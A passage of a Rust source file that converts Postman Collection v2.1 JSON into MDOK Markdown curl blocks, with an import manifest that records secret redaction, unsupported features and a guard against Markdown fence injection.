//! Safe, reviewable lowering from Postman Collection v2.1 JSON to MDOK
//! Markdown.
//!
//! The importer intentionally does not emulate the Postman JavaScript
//! runtime. It preserves source order, produces canonical request blocks, and
//! records every semantic that needs a human decision in the import manifest.

#![forbid(unsafe_code)]

use serde::Serialize;
use serde_json::{Map, Value};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::fs;
use std::path::Path;
use thiserror::Error;

pub const IMPORT_VERSION: &str = "mdok.postman-import.v1";
pub const POSTMAN_COLLECTION_V2_1_SCHEMA: &str =
    "https://schema.getpostman.com/json/collection/v2.1.0/collection.json";
pub const MAX_COLLECTION_BYTES: usize = 16 * 1024 * 1024;

const FENCE: &str = "\x60\x60\x60";

#[derive(Clone, Debug, Default)]
pub struct ImportOptions {
    /// Emit generated Markdown even when the manifest contains blocking
    /// issues. The issues remain in the manifest and must be reviewed.
    pub allow_lossy: bool,
}

#[derive(Debug, Error)]
pub enum ImportError {
    #[error("Postman collection is {observed} bytes; the maximum is {limit}")]
    InputTooLarge { observed: usize, limit: usize },
    #[error("cannot read Postman collection: {0}")]
    Read(#[from] std::io::Error),
    #[error("invalid Postman JSON: {0}")]
    Json(#[from] serde_json::Error),
    #[error("invalid Postman collection: {0}")]
    Invalid(String),
}

#[derive(Clone, Debug)]
pub struct ImportOutput {
    pub markdown: String,
    pub manifest: ImportManifest,
}

impl ImportOutput {
    pub fn has_blockers(&self) -> bool {
        self.manifest
            .issues
            .iter()
            .any(|issue| issue.severity == IssueSeverity::Error)
    }
}

#[derive(Clone, Debug, Serialize)]
pub struct ImportManifest {
    pub import_version: String,
    pub source_schema: String,
    pub source_path: Option<String>,
    pub source_sha256: String,
    pub collection_name: String,
    pub generated_steps: Vec<GeneratedStep>,
    pub issues: Vec<ImportIssue>,
    pub secret_variables: Vec<String>,
}

#[derive(Clone, Debug, Serialize)]
pub struct GeneratedStep {
    pub name: String,
    pub json_pointer: String,
    pub folder_path: Vec<String>,
    pub checks: usize,
    pub captures: usize,
}

#[derive(Clone, Debug, Serialize)]
pub struct ImportIssue {
    pub code: String,
    pub severity: IssueSeverity,
    pub message: String,
    pub json_pointer: String,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum IssueSeverity {
    Warning,
    Error,
}

#[derive(Clone, Debug)]
struct RequestOutput {
    name: String,
    folder_path: Vec<String>,
    json_pointer: String,
    command: String,
    description: Option<String>,
    checks: Vec<String>,
    captures: Vec<String>,
}

#[derive(Clone, Debug, Default)]
struct Context {
    variables: BTreeMap<String, String>,
    auth: Option<Value>,
    behavior: BTreeMap<String, Value>,
    test_scripts: Vec<String>,
    pre_request_scripts: Vec<String>,
}

struct Importer {
    source_path: Option<String>,
    source_sha256: String,
    collection_name: String,
    collection_description: Option<String>,
    folder_descriptions: BTreeMap<String, String>,
    variables: BTreeMap<String, String>,
    secret_variables: BTreeSet<String>,
    requests: Vec<RequestOutput>,
    issues: Vec<ImportIssue>,
    used_names: BTreeSet<String>,
    secret_placeholder_counts: BTreeMap<String, usize>,
}

pub fn import_collection_file(
    path: impl AsRef<Path>,
    options: &ImportOptions,
) -> Result<ImportOutput, ImportError> {
    let path = path.as_ref();
    let bytes = fs::read(path)?;
    import_collection_bytes(&bytes, Some(path), options)
}

pub fn import_collection_bytes(
    bytes: &[u8],
    source_path: Option<impl AsRef<Path>>,
    options: &ImportOptions,
) -> Result<ImportOutput, ImportError> {
    if bytes.len() > MAX_COLLECTION_BYTES {
        return Err(ImportError::InputTooLarge {
            observed: bytes.len(),
            limit: MAX_COLLECTION_BYTES,
        });
    }
    let root: Value = serde_json::from_slice(bytes)?;
    let object = root
        .as_object()
        .ok_or_else(|| ImportError::Invalid("collection root must be a JSON object".to_owned()))?;
    let info = object
        .get("info")
        .and_then(Value::as_object)
        .ok_or_else(|| ImportError::Invalid("collection.info is required".to_owned()))?;
    let items = object
        .get("item")
        .and_then(Value::as_array)
        .ok_or_else(|| ImportError::Invalid("collection.item must be an array".to_owned()))?;
    let schema = info
        .get("schema")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_owned();
    if !schema.contains("/collection/v2.1.0/") && !schema.contains("/collection/v2.1/") {
        return Err(ImportError::Invalid(format!(
            "only Postman Collection v2.1 is supported; found {}",
            if schema.is_empty() {
                "no schema"
            } else {
                schema.as_str()
            }
        )));
    }
    let collection_name = info
        .get("name")
        .and_then(Value::as_str)
        .filter(|name| !name.trim().is_empty())
        .unwrap_or("Imported Postman collection")
        .trim()
        .to_owned();
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    let source_sha256 = format!("{:x}", hasher.finalize());
    let mut importer = Importer {
        source_path: source_path.map(|path| path.as_ref().display().to_string()),
        source_sha256,
        collection_name: collection_name.clone(),
        collection_description: description_text(object.get("description")),
        folder_descriptions: BTreeMap::new(),
        variables: BTreeMap::new(),
        secret_variables: BTreeSet::new(),
        requests: Vec::new(),
        issues: Vec::new(),
        used_names: BTreeSet::new(),
        secret_placeholder_counts: BTreeMap::new(),
    };
    if matches!(object.get("version"), Some(Value::Object(version)) if !version.is_empty()) {
        importer.issue(
            "MDOK-PM-VERSION",
            IssueSeverity::Warning,
            "collection version metadata is not imported",
            "/version",
        );
    }
    if let Some(id) = object
        .get("info")
        .and_then(|info| info.get("_postman_id"))
        .and_then(Value::as_str)
    {
        importer.issue(
            "MDOK-PM-INFO-ID",
            IssueSeverity::Warning,
            format!("collection info._postman_id {id:?} is an internal identifier and is not imported"),
            "/info/_postman_id",
        );
    }
    let mut context = Context::default();
    importer.merge_variables(&mut context, object.get("variable"), "/variable");
    context.auth = object.get("auth").cloned();
    importer.merge_behavior(
        &mut context,
        object.get("protocolProfileBehavior"),
        "/protocolProfileBehavior",
    );
    importer.merge_events(&mut context, object.get("event"), "/event");
    importer.walk_items(items, &context, &[], "/item");
    let markdown = importer.render_markdown();
    let manifest = importer.manifest();
    let _ = options;
    Ok(ImportOutput { markdown, manifest })
}

impl Importer {
    fn manifest(&self) -> ImportManifest {
        ImportManifest {
            import_version: IMPORT_VERSION.to_owned(),
            source_schema: POSTMAN_COLLECTION_V2_1_SCHEMA.to_owned(),
            source_path: self.source_path.clone(),
            source_sha256: self.source_sha256.clone(),
            collection_name: self.collection_name.clone(),
            generated_steps: self
                .requests
                .iter()
                .map(|request| GeneratedStep {
                    name: request.name.clone(),
                    json_pointer: request.json_pointer.clone(),
                    folder_path: request.folder_path.clone(),
                    checks: request.checks.len(),
                    captures: request.captures.len(),
                })
                .collect(),
            issues: self.issues.clone(),
            secret_variables: self.secret_variables.iter().cloned().collect(),
        }
    }

    fn issue(
        &mut self,
        code: &str,
        severity: IssueSeverity,
        message: impl Into<String>,
        pointer: impl Into<String>,
    ) {
        self.issues.push(ImportIssue {
            code: code.to_owned(),
            severity,
            message: message.into(),
            json_pointer: pointer.into(),
        });
    }

    fn secret_placeholder(&mut self, label: &str) -> String {
        let base = format!("postman_{}", sanitize_name(label));
        let ordinal = self
            .secret_placeholder_counts
            .entry(base.clone())
            .and_modify(|ordinal| *ordinal += 1)
            .or_insert(1);
        let name = if *ordinal == 1 {
            base
        } else {
            format!("{base}_{ordinal}")
        };
        self.secret_variables.insert(name.clone());
        name
    }

    /// Defer an attacker-controlled value into the generated `toml mdok vars`
    /// block and return a `{{name|raw}}` template reference to use inside the
    /// curl command fence body.
    ///
    /// This neutralizes Markdown fence injection (security finding F4b): a
    /// Postman value containing a newline + ```` ``` ```` could otherwise
    /// terminate the curl fence early and inject an executable block. Routing
    /// the value through the vars block keeps it as data (serialized safely via
    /// `toml_string`, which escapes `\n`/`\r`/`"`/`\`), so the fence body only
    /// ever contains template references — never raw newlines or fence
    /// delimiters. This mirrors `crates/mdok-cli/src/transient.rs`.
    fn defer_value(&mut self, value: &str, pointer: &str) -> String {
        let ordinal = self.variables.len();
        let name = format!("mdok_pm_arg_{ordinal}");
        self.variables.insert(name.clone(), value.to_string());
        // If the value looks secret, keep it out of the rendered vars block
        // (existing render_markdown skips secret_variables) and surface the
        // usual secret placeholder flow instead.
        if looks_secret(&name) {
            self.secret_variables.insert(name.clone());
        }
        let _ = pointer;
        format!("{{{{{name}|raw}}}}")
    }

    fn protect_secret_literal(&mut self, label: &str, filter: &str, pointer: &str) -> String {
        let name = self.secret_placeholder(label);
        self.issue(
            "MDOK-PM-SECRET",
            IssueSeverity::Error,
            format!(
                "literal secret-looking value for {label:?} was replaced with {name:?}; provide it through --secret or a reviewed environment mapping"
            ),
            pointer,
        );
        format!("{{{{{name}|{filter}}}}}")
    }

    fn render_value(&mut self, label: &str, value: &str, filter: &str, pointer: &str) -> String {
        if value.contains("{{") {
            self.normalize_template(value, filter, pointer)
        } else if looks_secret(label) {
            self.protect_secret_literal(label, filter, pointer)
        } else {
            value.to_owned()
        }
    }

    fn merge_behavior(&mut self, context: &mut Context, value: Option<&Value>, pointer: &str) {
        let Some(object) = value.and_then(Value::as_object) else {
            return;
        };
        for (key, value) in object {
            context.behavior.insert(key.clone(), value.clone());
        }
        if object.keys().any(|key| {
            !matches!(
                key.as_str(),
                "followRedirects" | "maxRedirects" | "disableCookies" | "strictSSL"
            )
        }) {
            self.issue(
                "MDOK-PM-BEHAVIOR",
                IssueSeverity::Warning,
                "protocolProfileBehavior contains keys with no direct MDOK lowering",
                pointer,
            );
        }
    }

    fn merge_events(&mut self, context: &mut Context, value: Option<&Value>, pointer: &str) {
        let Some(events) = value.and_then(Value::as_array) else {
            return;
        };
        for (index, event) in events.iter().enumerate() {
            let event_pointer = format!("{pointer}/{index}");
            if event.get("disabled").and_then(Value::as_bool) == Some(true) {
                continue; // Postman semantics: a disabled event does not run
            }
            let listen = event
                .get("listen")
                .and_then(Value::as_str)
                .unwrap_or_default();
            let Some(source) = script_source(event) else {
                self.issue(
                    "MDOK-PM-SCRIPT",
                    IssueSeverity::Error,
                    "event has no readable script source",
                    event_pointer,
                );
                continue;
            };
            if listen == "prerequest" {
                context.pre_request_scripts.push(source);
            } else if listen == "test" {
                context.test_scripts.push(source);
            } else {
                self.issue(
                    "MDOK-PM-SCRIPT",
                    IssueSeverity::Warning,
                    format!("event type {listen:?} is not imported"),
                    event_pointer,
                );
            }
        }
    }

    fn walk_items(
        &mut self,
        items: &[Value],
        parent: &Context,
        folder_path: &[String],
        pointer: &str,
    ) {
        for (index, item) in items.iter().enumerate() {
            let item_pointer = format!("{pointer}/{index}");
            let Some(object) = item.as_object() else {
                self.issue(
                    "MDOK-PM-ITEM",
                    IssueSeverity::Error,
                    "collection item must be an object",
                    item_pointer,
                );
                continue;
            };
            if let Some(nested) = object.get("item").and_then(Value::as_array) {
                let mut context = parent.clone();
                self.merge_variables(
                    &mut context,
                    object.get("variable"),
                    &format!("{item_pointer}/variable"),
                );
                if object.get("auth").is_some() {
                    context.auth = object.get("auth").cloned();
                }
                self.merge_behavior(
                    &mut context,
                    object.get("protocolProfileBehavior"),
                    &format!("{item_pointer}/protocolProfileBehavior"),
                );
                self.merge_events(
                    &mut context,
                    object.get("event"),
                    &format!("{item_pointer}/event"),
                );
                let mut next_folder = folder_path.to_vec();
                if let Some(name) = object
                    .get("name")
                    .and_then(Value::as_str)
                    .map(str::trim)
                    .filter(|name| !name.is_empty())
                {
                    next_folder.push(name.to_owned());
                    if let Some(description) = description_text(object.get("description")) {
                        self.folder_descriptions
                            .insert(next_folder.join("/"), description);
                    }
                }
                self.walk_items(
                    nested,
                    &context,
                    &next_folder,
                    &format!("{item_pointer}/item"),
                );
            } else if object.contains_key("request") {
                self.process_request(object, parent, folder_path, &item_pointer);
            } else {
                self.issue(
                    "MDOK-PM-ITEM",
                    IssueSeverity::Warning,
                    "item has neither a nested item list nor a request",
                    item_pointer,
                );
            }
        }
    }

    fn process_request(
        &mut self,
        object: &Map<String, Value>,
        parent: &Context,
        folder_path: &[String],
        pointer: &str,
    ) {
        let mut context = parent.clone();
        self.merge_variables(
            &mut context,
            object.get("variable"),
            &format!("{pointer}/variable"),
        );
        if object.get("auth").is_some() {
            context.auth = object.get("auth").cloned();
        }
        self.merge_behavior(
            &mut context,
            object.get("protocolProfileBehavior"),
            &format!("{pointer}/protocolProfileBehavior"),
        );
        self.merge_events(
            &mut context,
            object.get("event"),
            &format!("{pointer}/event"),
        );
        let item_description = description_text(object.get("description"));
        if let Some(request_object) = object.get("request").and_then(Value::as_object) {
            if let Some(url_object) = request_object.get("url").and_then(Value::as_object) {
                self.merge_variables(
                    &mut context,
                    url_object.get("variable"),
                    &format!("{pointer}/request/url/variable"),
                );
            }
            self.merge_behavior(
                &mut context,
                request_object.get("protocolProfileBehavior"),
                &format!("{pointer}/request/protocolProfileBehavior"),
            );
            if object
                .get("response")
                .and_then(Value::as_array)
                .is_some_and(|responses| !responses.is_empty())
            {
                self.issue(
                    "MDOK-PM-EXAMPLES",
                    IssueSeverity::Warning,
                    "saved Postman response examples (including bodies, headers, and cookies) are not emitted into MDOK Markdown",
                    format!("{pointer}/response"),
                );
            }
            if request_object.contains_key("proxy")
                && request_object.get("proxy").is_some_and(Value::is_object)
            {
                self.issue(
                    "MDOK-PM-PROXY",
                    IssueSeverity::Error,
                    "request proxy configuration needs an explicit reviewed MDOK mapping",
                    format!("{pointer}/request/proxy"),
                );
            }
            if request_object.contains_key("certificate")
                && request_object.get("certificate").is_some_and(Value::is_object)
            {
                self.issue(
                    "MDOK-PM-CERT",
                    IssueSeverity::Error,
                    "request client certificates require an explicit reviewed artifact mapping",
                    format!("{pointer}/request/certificate"),
                );
            }
        }
        let request_name = object
            .get("name")
            .and_then(Value::as_str)
            .unwrap_or("request");
        let name = self.unique_name(request_name);
        let request = object.get("request").unwrap_or(&Value::Null);
        let Some(command) = self.lower_request(request, &context, &format!("{pointer}/request"))
        else {
            return;
        };
        if !context.pre_request_scripts.is_empty() {
            self.issue(
                "MDOK-PM-PREREQUEST",
                IssueSeverity::Error,
                "pre-request JavaScript is not executed by the MDOK runtime",
                format!("{pointer}/event"),
            );
        }
        let (checks, captures) = self.translate_scripts(&context.test_scripts, pointer);
        self.requests.push(RequestOutput {
            name,
            folder_path: folder_path.to_vec(),
            json_pointer: pointer.to_owned(),
            command,
            description: item_description,
            checks,
            captures,
        });
    }

    fn merge_variables(&mut self, context: &mut Context, value: Option<&Value>, pointer: &str) {
        let Some(variables) = value.and_then(Value::as_array) else {
            return;
        };
        for (index, variable) in variables.iter().enumerate() {
            let variable_pointer = format!("{pointer}/{index}");
            let Some(object) = variable.as_object() else {
                self.issue(
                    "MDOK-PM-VARIABLE",
                    IssueSeverity::Error,
                    "variable entry must be an object",
                    variable_pointer,
                );
                continue;
            };
            if object.get("disabled").and_then(Value::as_bool) == Some(true) {
                continue;
            }
            let Some(name) = object.get("key").and_then(Value::as_str).map(str::trim) else {
                self.issue(
                    "MDOK-PM-VARIABLE",
                    IssueSeverity::Error,
                    "variable entry has no key",
                    variable_pointer,
                );
                continue;
            };
            if name.is_empty() {
                self.issue(
                    "MDOK-PM-VARIABLE",
                    IssueSeverity::Error,
                    "variable key cannot be empty",
                    variable_pointer,
                );
                continue;
            }
            let raw_value = object
                .get("value")
                .or_else(|| object.get("default"))
                .cloned()
                .unwrap_or(Value::Null);
            let Some(value) = value_as_string(&raw_value) else {
                self.issue(
                    "MDOK-PM-VARIABLE",
                    IssueSeverity::Error,
                    format!("variable {name:?} is not a scalar value"),
                    variable_pointer,
                );
                continue;
            };
            if looks_secret(name) {
                self.secret_variables.insert(name.to_owned());
            }
            if let Some(existing) = context.variables.get(name)
                && existing != &value
            {
                self.issue(
                    "MDOK-PM-VAR-SCOPE",
                    IssueSeverity::Error,
                    format!(
                        "variable {name:?} has conflicting values across Postman scopes; MDOK needs an explicit environment mapping"
                    ),
                    variable_pointer,
                );
                continue;
            }
            context.variables.insert(name.to_owned(), value.clone());
            if let Some(existing) = self.variables.get(name) {
                if existing != &value {
                    self.issue(
                        "MDOK-PM-VAR-SCOPE",
                        IssueSeverity::Error,
                        format!(
                            "variable {name:?} is shadowed with a different value; the generated global block would change scope semantics"
                        ),
                        variable_pointer,
                    );
                }
            } else {
                self.variables.insert(name.to_owned(), value);
            }
        }
    }

    fn unique_name(&mut self, requested: &str) -> String {
        let base = sanitize_name(requested);
        if self.used_names.insert(base.clone()) {
            return base;
        }
        for ordinal in 2.. {
            let candidate = format!("{base}_{ordinal}");
            if self.used_names.insert(candidate.clone()) {
                return candidate;
            }
        }
        unreachable!("the step-name loop always returns")
    }

    fn render_markdown(&self) -> String {
        let mut output = String::new();
        writeln!(output, "# {}", markdown_heading(&self.collection_name)).unwrap();
        output.push('\n');
        if let Some(description) = &self.collection_description {
            writeln!(output, "<!-- description: {description} -->").unwrap();
            output.push('\n');
        }
        if !self.variables.is_empty() {
            output.push_str(FENCE);
            output.push_str("toml mdok vars\n");
            for (name, value) in &self.variables {
                if self.secret_variables.contains(name) {
                    continue;
                }
                writeln!(output, "{name} = {}", toml_string(value)).unwrap();
            }
            output.push_str(FENCE);
            output.push_str("\n\n");
        }
        if !self.secret_variables.is_empty() {
            output.push_str("<!-- Secret-looking variables are intentionally omitted from the generated block: ");
            let mut first = true;
            for name in &self.secret_variables {
                if !first {
                    output.push_str(", ");
                }
                first = false;
                output.push_str(name);
            }
            output.push_str(
                ". Provide them with --secret or a reviewed environment mapping. -->\n\n",
            );
        }
        output.push_str(
            "<!-- Generated by mdok-postman; review the import manifest before execution. -->\n\n",
        );
        let mut last_folder: Vec<String> = Vec::new();
        for request in &self.requests {
            let common = common_prefix_len(&last_folder, &request.folder_path);
            last_folder.truncate(common);
            for folder in request.folder_path.iter().skip(common) {
                let level = 2 + last_folder.len();
                writeln!(output, "{} {}", "#".repeat(level), markdown_heading(folder)).unwrap();
                if let Some(description) = self.folder_descriptions.get(&folder_path_key(&last_folder, folder)) {
                    output.push('\n');
                    writeln!(output, "<!-- description: {description} -->").unwrap();
                }
                output.push('\n');
                last_folder.push(folder.clone());
            }
            let request_level = 2 + request.folder_path.len();
            writeln!(
                output,
                "{} {}",
                "#".repeat(request_level),
                markdown_heading(&request.name)
            )
            .unwrap();
            output.push('\n');
            if let Some(description) = &request.description {
                writeln!(output, "<!-- description: {description} -->").unwrap();
                output.push('\n');
            }
            writeln!(output, "{FENCE}curl mdok name={}", request.name).unwrap();
            output.push_str(&request.command);
            output.push('\n');
            output.push_str(FENCE);
            output.push_str("\n\n");
            for check in &request.checks {
                writeln!(output, "{FENCE}jmespath mdok check={}", request.name).unwrap();
                output.push_str(check);
                output.push('\n');
                output.push_str(FENCE);
                output.push_str("\n\n");
            }
            for capture in &request.captures {
                writeln!(output, "{FENCE}jmespath mdok capture={}", request.name).unwrap();
                output.push_str(capture);
                output.push('\n');
                output.push_str(FENCE);
                output.push_str("\n\n");
            }
        }
        output
    }

    fn lower_request(
        &mut self,
        request: &Value,
        context: &Context,
        pointer: &str,
    ) -> Option<String> {
        let (method, url_value, headers, body, auth) = match request {
            Value::String(url) => (
                "GET".to_owned(),
                Value::String(url.clone()),
                Vec::new(),
                None,
                context.auth.clone(),
            ),
            Value::Object(object) => (
                object
                    .get("method")
                    .and_then(Value::as_str)
                    .unwrap_or("GET")
                    .to_ascii_uppercase(),
                object.get("url").cloned().unwrap_or(Value::Null),
                object
                    .get("header")
                    .and_then(Value::as_array)
                    .cloned()
                    .unwrap_or_default(),
                object.get("body").cloned(),
                object.get("auth").cloned().or_else(|| context.auth.clone()),
            ),
            _ => {
                self.issue(
                    "MDOK-PM-REQUEST",
                    IssueSeverity::Error,
                    "request must be an object or URL string",
                    pointer,
                );
                return None;
            }
        };
        let mut url = self.lower_url(&url_value, pointer);
        let mut args = vec!["curl".to_owned(), "--request".to_owned(), method];
        let mut rendered_headers = Vec::new();
        for (index, header) in headers.iter().enumerate() {
            let header_pointer = format!("{pointer}/header/{index}");
            let Some(object) = header.as_object() else {
                self.issue(
                    "MDOK-PM-HEADER",
                    IssueSeverity::Error,
                    "header entry must be an object",
                    header_pointer,
                );
                continue;
            };
            if object.get("disabled").and_then(Value::as_bool) == Some(true) {
                continue;
            }
            let Some(name) = object.get("key").and_then(Value::as_str) else {
                self.issue(
                    "MDOK-PM-HEADER",
                    IssueSeverity::Error,
                    "header has no key",
                    header_pointer,
                );
                continue;
            };
            let value = object
                .get("value")
                .and_then(Value::as_str)
                .unwrap_or_default();
            let value = if sensitive_header(name) && !value.contains("{{") {
                self.protect_secret_literal(name, "header", &header_pointer)
            } else {
                self.normalize_template(value, "header", &header_pointer)
            };
            rendered_headers.push(format!("{name}: {value}"));
        }
        self.lower_auth(
            &mut url,
            &mut rendered_headers,
            &mut args,
            auth.as_ref(),
            pointer,
        );
        for header in rendered_headers {
            args.push("--header".to_owned());
            args.push(quote_arg(&self.defer_value(&header, pointer)));
        }
        self.lower_body(&mut args, body.as_ref(), pointer);
        self.lower_behavior(&mut args, context, pointer);
        args.push(quote_arg(&self.defer_value(&url, pointer)));
        Some(args.join(" "))
    }

    fn lower_url(&mut self, value: &Value, pointer: &str) -> String {
        let raw = match value {
            Value::String(raw) => raw.clone(),
            Value::Object(object) => {
                let mut base = object
                    .get("raw")
                    .and_then(Value::as_str)
                    .map(ToOwned::to_owned)
                    .unwrap_or_else(|| {
                        let protocol = object
                            .get("protocol")
                            .and_then(Value::as_str)
                            .unwrap_or("http");
                        let host = object
                            .get("host")
                            .and_then(|host| {
                                host.as_array().map(|parts| {
                                    parts
                                        .iter()
                                        .filter_map(Value::as_str)
                                        .collect::<Vec<_>>()
                                        .join(".")
                                })
                            })
                            .filter(|host| !host.is_empty())
                            .or_else(|| {
                                object
                                    .get("host")
                                    .and_then(Value::as_str)
                                    .map(ToOwned::to_owned)
                            })
                            .unwrap_or_else(|| "{{host}}".to_owned());
                        let path = object
                            .get("path")
                            .and_then(|path| match path {
                                Value::Array(parts) => Some(
                                    parts
                                        .iter()
                                        .filter_map(Value::as_str)
                                        .map(|part| {
                                            if let Some(name) = part.strip_prefix(':') {
                                                format!("{{{{{name}|url}}}}")
                                            } else {
                                                part.to_owned()
                                            }
                                        })
                                        .collect::<Vec<_>>()
                                        .join("/"),
                                ),
                                Value::String(path) => Some(path.clone()),
                                _ => None,
                            })
                            .unwrap_or_default();
                        let port = object
                            .get("port")
                            .and_then(Value::as_str)
                            .map(str::trim)
                            .filter(|port| !port.is_empty())
                            .map(|port| format!(":{port}"))
                            .unwrap_or_default();
                        let hash = object
                            .get("hash")
                            .and_then(Value::as_str)
                            .map(str::trim)
                            .filter(|hash| !hash.is_empty())
                            .map(|hash| format!("#{hash}"))
                            .unwrap_or_default();
                        if path.is_empty() {
                            format!("{protocol}://{host}{port}{hash}")
                        } else {
                            format!("{protocol}://{host}{port}/{path}{hash}")
                        }
                    });
                if let Some(query) = object.get("query").and_then(Value::as_array) {
                    let mut base_without_query = base.clone();
                    let fragment = base_without_query
                        .find('#')
                        .map(|index| base_without_query.split_off(index));
                    if let Some(index) = base_without_query.find('?') {
                        base_without_query.truncate(index);
                    }
                    let mut query_parts = Vec::new();
                    for (index, entry) in query.iter().enumerate() {
                        let query_pointer = format!("{pointer}/url/query/{index}");
                        let Some(entry) = entry.as_object() else {
                            self.issue(
                                "MDOK-PM-URL",
                                IssueSeverity::Error,
                                "query entry must be an object",
                                query_pointer,
                            );
                            continue;
                        };
                        if entry.get("disabled").and_then(Value::as_bool) == Some(true) {
                            continue;
                        }
                        let Some(key) = entry.get("key").and_then(Value::as_str) else {
                            self.issue(
                                "MDOK-PM-URL",
                                IssueSeverity::Error,
                                "query entry has no key",
                                query_pointer,
                            );
                            continue;
                        };
                        let value = entry
                            .get("value")
                            .and_then(Value::as_str)
                            .unwrap_or_default();
                        let key = self.normalize_template(key, "url", &query_pointer);
                        let value = if looks_secret(&key) {
                            self.render_value(&key, value, "url", &query_pointer)
                        } else {
                            self.normalize_template(value, "url", &query_pointer)
                        };
                        query_parts.push(format!("{key}={value}"));
                    }
                    base = base_without_query;
                    if !query_parts.is_empty() {
                        base.push('?');
                        base.push_str(&query_parts.join("&"));
                    }
                    if let Some(fragment) = fragment {
                        base.push_str(&fragment);
                    }
                }
                base
            }
            _ => {
                self.issue(
                    "MDOK-PM-URL",
                    IssueSeverity::Error,
                    "request URL is missing or has an unsupported shape",
                    format!("{pointer}/url"),
                );
                "{{missing_url}}".to_owned()
            }
        };
        // A Postman URL often has a variable containing the complete scheme
        // and host (for example {{base_url}}). URL-encoding that whole value
        // would turn the URL into a relative path, so preserve ordinary URL
        // templates as strings. Path/query entries are assigned the explicit
        // url filter above.
        let raw = self.redact_sensitive_query(&raw, pointer);
        let raw = replace_colon_path_parameters(&raw);
        self.normalize_template(&raw, "string", &format!("{pointer}/url"))
    }

    fn redact_sensitive_query(&mut self, input: &str, pointer: &str) -> String {
        let Some(query_start) = input.find('?') else {
            return input.to_owned();
        };
        let (prefix, query_and_fragment) = input.split_at(query_start + 1);
        let (query, fragment) = query_and_fragment
            .split_once('#')
            .map_or((query_and_fragment, ""), |(query, fragment)| {
                (query, fragment)
            });
        let mut changed = false;
        let mut fields = Vec::new();
        for field in query.split('&') {
            let Some((key, value)) = field.split_once('=') else {
                fields.push(field.to_owned());
                continue;
            };
            if sensitive_header(key) || looks_secret(key) {
                if value.contains("{{") || value.is_empty() {
                    fields.push(field.to_owned());
                } else {
                    let replacement = self.protect_secret_literal(key, "url", pointer);
                    fields.push(format!("{key}={replacement}"));
                    changed = true;
                }
            } else {
                fields.push(field.to_owned());
            }
        }
        if !changed {
            return input.to_owned();
        }
        let mut output = String::with_capacity(input.len());
        output.push_str(prefix);
        output.push_str(&fields.join("&"));
        if !fragment.is_empty() {
            output.push('#');
            output.push_str(fragment);
        }
        output
    }

    fn lower_auth(
        &mut self,
        url: &mut String,
        headers: &mut Vec<String>,
        args: &mut Vec<String>,
        auth: Option<&Value>,
        pointer: &str,
    ) {
        let Some(object) = auth.and_then(Value::as_object) else {
            return;
        };
        let auth_type = object
            .get("type")
            .and_then(Value::as_str)
            .unwrap_or("noauth");
        match auth_type {
            "noauth" => {}
            "basic" => {
                let username = self.auth_attr(object, auth_type, "username", pointer);
                let password = self.auth_attr(object, auth_type, "password", pointer);
                args.push("--user".to_owned());
                let user_value = format!(
                    "{}:{}",
                    self.normalize_template(&username, "raw", pointer),
                    self.render_value("password", &password, "raw", pointer)
                );
                args.push(quote_arg(&self.defer_value(&user_value, pointer)));
            }
            "bearer" => {
                let token = self.auth_attr(object, auth_type, "token", pointer);
                headers.push(format!(
                    "Authorization: Bearer {}",
                    self.render_value("token", &token, "header", pointer)
                ));
            }
            "apikey" => {
                let key = self.auth_attr(object, auth_type, "key", pointer);
                let value = self.auth_attr(object, auth_type, "value", pointer);
                match self.auth_attr(object, auth_type, "in", pointer).as_str() {
                    "query" => {
                        let separator = if url.contains('?') { '&' } else { '?' };
                        url.push(separator);
                        url.push_str(&self.normalize_template(&key, "url", pointer));
                        url.push('=');
                        url.push_str(&self.render_value(&key, &value, "url", pointer));
                    }
                    "header" | "" => headers.push(format!(
                        "{}: {}",
                        key,
                        self.render_value(&key, &value, "header", pointer)
                    )),
                    other => self.issue(
                        "MDOK-PM-AUTH",
                        IssueSeverity::Error,
                        format!("API key placement {other:?} is unsupported"),
                        pointer,
                    ),
                }
            }
            other => self.issue(
                "MDOK-PM-AUTH",
                IssueSeverity::Error,
                format!("Postman auth type {other:?} needs an explicit MDOK mapping"),
                pointer,
            ),
        }
    }

    fn auth_attr(
        &mut self,
        object: &Map<String, Value>,
        auth_type: &str,
        key: &str,
        pointer: &str,
    ) -> String {
        let Some(entries) = object.get(auth_type).and_then(Value::as_array) else {
            return String::new();
        };
        entries
            .iter()
            .find(|entry| entry.get("key").and_then(Value::as_str) == Some(key))
            .and_then(|entry| entry.get("value"))
            .and_then(value_as_string)
            .unwrap_or_else(|| {
                self.issue(
                    "MDOK-PM-AUTH",
                    IssueSeverity::Warning,
                    format!("auth attribute {key:?} is absent or non-scalar"),
                    pointer,
                );
                String::new()
            })
    }

    fn lower_body(&mut self, args: &mut Vec<String>, body: Option<&Value>, pointer: &str) {
        let Some(object) = body.and_then(Value::as_object) else {
            return;
        };
        let mode = object
            .get("mode")
            .and_then(Value::as_str)
            .unwrap_or_default();
        match mode {
            "raw" => {
                if let Some(raw) = object.get("raw").and_then(Value::as_str) {
                    args.push("--data-raw".to_owned());
                    let value = if raw_body_looks_sensitive(raw) && !raw.contains("{{") {
                        self.protect_secret_literal("body", "raw", pointer)
                    } else {
                        self.normalize_template(raw, "raw", pointer)
                    };
                    args.push(quote_arg(&self.defer_value(&value, pointer)));
                }
            }
            "urlencoded" => {
                self.lower_key_values(args, object.get("urlencoded"), "--data-urlencode", pointer);
            }
            "formdata" => {
                self.lower_key_values(args, object.get("formdata"), "--form", pointer);
            }
            "graphql" => {
                let graphql = object.get("graphql").and_then(Value::as_object);
                if let Some(graphql) = graphql {
                    let payload = serde_json::json!({
                        "query": graphql.get("query").and_then(Value::as_str).unwrap_or_default(),
                        "variables": graphql.get("variables").cloned().unwrap_or_else(|| Value::Object(Map::new())),
                    });
                    args.push("--data-raw".to_owned());
                    args.push(quote_arg(&self.defer_value(&payload.to_string(), pointer)));
                } else {
                    self.issue(
                        "MDOK-PM-BODY",
                        IssueSeverity::Error,
                        "graphql body has no graphql object",
                        pointer,
                    );
                }
            }
            "file" => self.issue(
                "MDOK-PM-BODY-FILE",
                IssueSeverity::Error,
                "file upload bodies require an explicit reviewed artifact mapping",
                pointer,
            ),
            "" => {}
            other => self.issue(
                "MDOK-PM-BODY",
                IssueSeverity::Error,
                format!("Postman body mode {other:?} is unsupported"),
                pointer,
            ),
        }
    }

    fn lower_key_values(
